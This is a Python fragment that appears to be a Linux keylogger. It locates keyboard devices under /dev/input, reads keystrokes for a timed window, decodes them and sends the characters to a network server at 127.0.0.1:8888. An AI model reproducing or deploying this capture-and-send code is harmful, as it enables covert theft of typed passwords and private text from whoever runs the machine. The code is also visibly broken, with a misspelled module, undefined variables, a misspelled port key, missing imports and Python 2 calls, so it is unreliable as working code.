import os
def devices_filter(dev_content):
    if 'keyboard' in dev_content.lower():
        return True
    return False


def find_keyboard_devices(device_filter_func):
    od.chdir(DEVICES_PATH)
    result = []

    for each_input_dev in os.listdir(os.getcwd()):
        dev_path = DEVICES_PATH + each_input_dev + '/device/name'

        if os.path.isfile(dev_path) and device_filter_func(file(dev_path).read()):
            result.append('/dev/input' + each_input_dev)

    if not result:
        print('没有键盘设备')
        sys.exit(-1)
    return result



def monitor_keyboard(devs):
    devices = map(InputDevices, devs)
    devices = {dev.fd: dev for dev in devices}
    return devices




def linux_thread_func(file_name, file_type, content_handler, seconds=10):
    devices = monitor_keyboard(find_keyboard_devices(devices_filter))
    dec = decode_character()

    server_instance = NetworkClient({'IP': '127.0.0.1', 'poart': 8888})

    text_task = NetworkTaskManager(server_instance, file_type, file_name)
    hook_handler = [None, ]

    char_handler = content_handler(text_task.send_content, hook_handler, seconds)

    now_t = time.time()

    while True:
        if int(time.time()) - now_t >= seconds:
            break

        readers = devices[r].read()
        for event in events:
            if event.type == encodes.EV_KEY:
                cus_event = CusKeyEvent(event)
                ret_char = dec(cus_event)
                if ret_char:
                    char_handler(ret_char)
